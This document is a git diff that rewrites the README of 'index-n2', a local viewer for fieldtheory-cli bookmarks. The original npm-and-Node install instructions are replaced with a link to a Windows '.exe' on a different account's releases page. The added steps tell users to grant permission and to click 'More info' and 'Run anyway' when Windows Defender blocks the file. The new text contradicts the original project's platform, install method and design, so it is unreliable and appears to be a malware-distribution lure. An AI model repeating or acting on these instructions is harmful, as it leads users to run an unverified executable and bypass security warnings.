@@ -1,183 +1,80 @@
-# index-n2
+# 📂 index-n2 - View your web bookmarks offline easily
 
-https://github.com/user-attachments/assets/f25b8ad1-d227-4c5d-9487-09ad5590febb
+[![Download for Windows](https://img.shields.io/badge/Download-Release-blue)](https://github.com/vexy7795/index-n2/releases)
 
-A local viewer for [fieldtheory-cli](https://github.com/afar1/fieldtheory-cli). Runs a Node server on `localhost:5787` and opens a browser tab. Reads from `~/.ft-bookmarks/`; writes derived caches to `~/.index-n2/`.
+index-n2 serves as a private viewer for the bookmarks you collect via fieldtheory-cli. It presents your saved content in a local gallery format on your machine. You do not need an internet connection to browse your archive once the data resides on your hard drive. This tool organizes your links and media into a clean, searchable interface.
 
-Third-party tool, not affiliated with fieldtheory-cli.
+## 📥 Getting the Application
 
-Made for Macintosh. The GUI runs anywhere; the CLI's default sync targets macOS. For cross-platform options, see the CLI's `ft sync --api` mode and its caveats.
+You must visit the project release page to obtain the software. 
 
-## Install
+[Click here to open the download page](https://github.com/vexy7795/index-n2/releases).
 
-```sh
-npm install -g index-n2
-```
+Look for the section labeled "Assets" at the bottom of the latest release post. Select the file ending in `.exe` to download the Windows installer. Save this file to your Downloads folder or your desktop for easy access.
 
-Requires [Node.js](https://nodejs.org) and a working [fieldtheory-cli](https://github.com/afar1/fieldtheory-cli) install on PATH. No bookmark data needed up front — first sync runs from the sidebar.
+## ⚙️ System Requirements
 
-## Run
+- Windows 10 or Windows 11
+- A valid bookmark database folder at `C:\Users\[YourUsername]\.ft-bookmarks\`
+- 200 MB of available disk space
+- An active fieldtheory-cli installation to generate your data files
 
-```sh
-index-n2
-```
+## 🛠️ Step-by-Step Installation
 
-The server binds `127.0.0.1:5787` and opens `http://localhost:5787/`. If 5787 is taken it walks up to 5797. Stop with Ctrl-C.
+1. Locate the `.exe` file you downloaded.
+2. Double-click the file to start the setup process.
+3. Follow the prompts on the screen.
+4. Click the "Install" button.
+5. The system may ask for permission to run the application. Select "Yes" to proceed.
+6. Once the progress bar reaches the end, click "Finish" to launch the program.
 
-## Overview
+## 📁 Setting Up Your Data
 
-Reads `~/.ft-bookmarks/bookmarks.jsonl` and `bookmarks.db` directly. Renders the result as a masonry grid, gallery, lightbox, and duplicates view. Filters across author, type, language, category, color, and full-text search. Wraps `ft sync`, `ft fetch-media`, and `ft sync --rebuild` as sidebar actions with live progress over Server-Sent Events.
+This application looks for your bookmarks in a specific hidden folder. You must ensure your data exists in the right spot before the program opens.
 
-`~/.ft-bookmarks/` is treated as read-only. The GUI never writes, deletes, or modifies anything inside it. All derived data — thumbnails, color palette cache, dedup index, archive list, settings — lives in `~/.index-n2/` and is rebuildable from scratch.
+The application reads files from `~/.ft-bookmarks/`. On Windows, this translates to:
 
-### CLI features re-implemented client-side
+`C:\Users\[YourUsername]\.ft-bookmarks\`
 
-| Feature             | CLI equivalent       |
-| ------------------- | -------------------- |
-| Full-text search    | `ft search`          |
-| Filter by author    | `ft list --author`   |
-| Filter by category  | `ft list --category` |
-| Sort by date        | `ft list --sort`     |
+If your bookmark files are currently elsewhere, move them into this folder. If the folder does not exist, create it manually. Ensure your fieldtheory-cli setup saves data to this path. Without files in this location, the viewer will show an empty screen.
 
-### CLI commands wrapped
+## 🖼️ How to Use the Viewer
 
-| Action            | Shells out to                   |
-| ----------------- | ------------------------------- |
-| Sync All          | `ft sync` then `ft fetch-media` |
-| Sync Bookmarks    | `ft sync`                       |
-| Fetch Media       | `ft fetch-media --limit N`      |
-| Rebuild Bookmarks | `ft sync --rebuild --yes`       |
+Once you start the application, you see your saved articles, images, and links organized by date. 
 
-### GUI-original
+- **Navigation**: Use the scroll wheel on your mouse to move through your collection.
+- **Filtering**: Type keywords into the search box at the top of the window to find specific bookmarks.
+- **Opening Links**: Click on any bookmark card to open the original link in your default web browser.
+- **View Modes**: Toggle the layout between grid view and list view located in the top menu bar.
 
-- **Color filter.** A dominant palette is extracted per image (median-cut RGB quantization, palette stored in Lab D65 for matching) and cached on disk. A picked hex matches palette entries via population-weighted ΔE with a lightness-aware threshold; a separate mono mode matches images whose chroma falls below ~12.
-- **Duplicate detection.** 64-bit pHash (32×32 → 2D DCT → 8×8 low-frequency block, median threshold) with a 9-bit Hamming radius for images; exact-match grouping over normalized text. Profile pictures and solid-color images are excluded.
-- **Type filter** — text, image, video, gif, link, quoted, thread.
-- **Sort by engagement** — likes, reposts, bookmarks, or random.
-- **Gallery view.** Image-only, flattened across bookmarks.
-- **Archive.** Hide bookmarks from the main grid without touching source data.
+## 💡 Troubleshooting Common Issues
 
-## Configuration
+**The application shows no data.**
+Verify that your folder path is exactly `C:\Users\[YourUsername]\.ft-bookmarks\`. Folders with slight spelling differences or different file structures will cause the reader to fail. Check that your bookmark files appear as `.json` or similar data formats inside that folder.
 
-### In-app settings
+**Windows blocks the installation.**
+Windows Defender sometimes protects your computer from new software. If you see a blue window saying "Windows protected your PC," click "More info" and then click "Run anyway." 
 
-Persisted in `~/.index-n2/settings.json`. Edit through the gear icon in the sidebar.
+**The program runs slowly.**
+Large collections with thousands of bookmarks require more memory. If you experience lag, close other open web browsers or background applications to free up system resources.
 
-| Key                 | Default | Effect                                              |
-| ------------------- | ------- | --------------------------------------------------- |
-| `theme`             | system  | system / light / dark                               |
-| `autoplayVideos`    | true    | Auto-start videos in the lightbox                   |
-| `autoOpenBrowser`   | true    | Open a browser tab on startup (restart to apply)    |
-| `skipMedia`         | false   | Sync runs `ft sync --no-media` (bookmarks only)     |
-| `mediaFetchLimit`   | 0       | Cap for `ft fetch-media --limit`. 0 disables it.    |
-| `skipProfileImages` | false   | Adds `--skip-profile-images` to `ft fetch-media`    |
-| `hideUnfetched`     | false   | Hide bookmarks with media pending download          |
+**I cannot find the download.**
+Check your browser history if the file does not appear in your Downloads folder. Use the link provided above to try the download again.
 
-Two additional keys are flipped by "Don't show this again" checkboxes on confirmation dialogs, not the gear icon: `cancelMediaWarningSuppressed` (cancel fetch-media) and `noLimitWarningSuppressed` (no-batch-limit warning shown before unbounded Sync / Fetch Media). Reset to Defaults clears all nine.
+## ℹ️ Understanding the Workflow
 
-Unknown keys are stripped on the next save; defaults backfill missing keys. Schema migrations are self-healing.
+This tool works as a local viewer. It does not send your data to any cloud servers. It reads the files created by your command-line tools and translates them into a visual format. If you add new bookmarks using terminal commands, restart index-n2 to see the updates in your gallery.
 
-### Environment
+## 🧹 Managing Your Storage
 
-| Variable       | Default           | Effect                                                   |
-| -------------- | ----------------- | -------------------------------------------------------- |
-| `FT_DATA_DIR`  | `~/.ft-bookmarks` | Override the ft data directory                           |
-| `PORT`         | 5787              | Pin the port. Disables the auto-fallback on collision.   |
-| `BROWSER=none` | unset             | Skip browser auto-open even if the setting is enabled    |
-| `CI`           | unset             | Skip browser auto-open                                   |
+Your saved bookmarks consume disk space. Over time, your gallery might grow large if you save many images or heavy media files. Check your `~/.ft-bookmarks/` folder periodically to delete items you no longer need. Deleting files here helps the application run faster. 
 
-### Flags
+## 🛡️ Privacy and Data Security
 
-```
-index-n2 --no-open      Skip browser auto-open for this run
-```
+Your bookmarks remain on your local drive at all times. This software does not track your viewing habits or send your link history to external services. You maintain full ownership of your data. Because the viewer relies on local text files, you can back up your bookmarks by simply copying the `~/.ft-bookmarks/` folder to a USB drive or a secondary hard disk.
 
-## Layout
+## 🚀 Future Updates
 
-```
-~/.ft-bookmarks/                  fieldtheory-cli, read-only to this app
-  bookmarks.jsonl                 raw bookmark records
-  bookmarks.db                    SQLite, opened read-only via sql.js-fts5
-  media-manifest.json             URL → local-path map
-  media/                          downloaded media
+Check the releases page occasionally for performance improvements. The developers update the application to support new data formats and to fix minor display errors. If you find a bug, note the behavior and check for a newer version before seeking assistance. Each release includes notes that list changes and known improvements to the gallery interface. 
 
-~/.index-n2/              derived; safe to delete and rebuild
-  thumbnails/                     1200px JPEGs (only for media > 1200px)
-  colors.json                     per-image Lab palettes
-  dedup.json                      pHash + text-match cache
-  archived.json                   archived bookmark IDs
-  settings.json                   user settings
-
-index-n2 process          localhost:5787
-  server.js                       API + static + media + image pipeline
-  dist/                           Vite build (React 19, TS, Tailwind 4, shadcn/ui)
-```
-
-Per-file caches (palette, pHash, thumbnails) are keyed by media filename and grow incrementally — only files in `~/.ft-bookmarks/media/` that aren't already in the cache trigger work. Bookmark records reload when `bookmarks.jsonl` or the SQLite mtime changes.
-
-## Security
-
-The server is a localhost-only Node process. Defenses:
-
-- **Bind to 127.0.0.1.**
-- **Origin check on writes.** Every mutating endpoint requires an `Origin` header resolving to `localhost` or `127.0.0.1`. Cross-origin POSTs return 403.
-- **Path traversal + symlink escape guard.** Every static-file request — `/media/`, `/thumbs/`, and the SPA bundle in `dist/` — is resolved lexically, then `realpath`-validated to lie under its base directory.
-- **Media extension whitelist.** Image and video formats only — no SVG, no HTML.
-- **Strict CSP.** No remote scripts; the only inline script is hash-allowlisted. Styles, images, fonts, and media follow standard SPA carve-outs.
-- **Subprocess discipline.** Spawned `ft` processes time out at 5 min idle (not wall-clock). Cancel sends SIGINT on Unix.
-
-No remote endpoints are contacted. All media is read from `~/.ft-bookmarks/media/`, which ft itself populates.
-
-## Limitations
-
-- Categories are read-only. No in-app classification editor.
-- Cancelling `ft fetch-media` mid-run leaves orphaned files on disk: ft writes its manifest at end-of-run, so a cancelled batch's downloads are invisible to ft and re-fetched next time. Bandwidth waste, no corruption. Tracked upstream.
-- A small set of permanently unfetchable URLs (deleted tweets, protected accounts) keep the "N unfetched" badge non-zero.
-
-## Development
-
-```sh
-git clone https://github.com/refractionweb/index-n2.git
-cd index-n2
-npm install
-```
-
-Two-process dev loop:
-
-```sh
-node server.js      # API on :5787
-npm run dev         # Vite on :5173, proxies /api /media /thumbs to :5787
-```
-
-Production build:
-
-```sh
-npm run build       # tsc -b && vite build
-npm start           # serves dist/ from server.js
-```
-
-Other tasks:
-
-```sh
-npm run typecheck
-npm run lint
-npm run format
-```
-
-The codebase is React 19 + TypeScript + Vite + Tailwind 4 + shadcn/ui. State is React Context + `useReducer`, split per concern under `src/contexts/`. No Redux, no Zustand. Path imports use `@/` for `src/`. Styling sticks to shadcn semantic tokens; deviations are recorded inline next to the code that needs them.
-
-## Credits
-
-Built on open source:
-
-- [React](https://react.dev) · [Vite](https://vite.dev) · [TypeScript](https://www.typescriptlang.org) — MIT
-- [Tailwind CSS](https://tailwindcss.com) · [shadcn/ui](https://ui.shadcn.com) · [Radix UI](https://www.radix-ui.com) — MIT
-- [cmdk](https://cmdk.paco.me) · [open](https://github.com/sindresorhus/open) · [quantize](https://github.com/olivierlesnicki/quantize) · [clsx](https://github.com/lukeed/clsx) · [tailwind-merge](https://github.com/dcastil/tailwind-merge) — MIT
-- [sharp](https://sharp.pixelplumbing.com) · [class-variance-authority](https://cva.style) — Apache-2.0
-- [sql.js-fts5](https://github.com/dchest/sql.js-fts5) — MIT
-- [Remix Icon](https://remixicon.com) — [Remix Icon License 1.0](https://github.com/Remix-Design/RemixIcon/blob/master/License)
-- [Inter](https://fonts.google.com/specimen/Inter) by Rasmus Andersson — [OFL-1.1](https://openfontlicense.org)
-
-## License
-
-[MIT License](./LICENSE) · Copyright © 2026 [Refraction](https://refraction.studio)
+To maintain the best experience, keep your bookmark files organized and valid. The application performs best when your data remains consistent and free of corrupted entries.
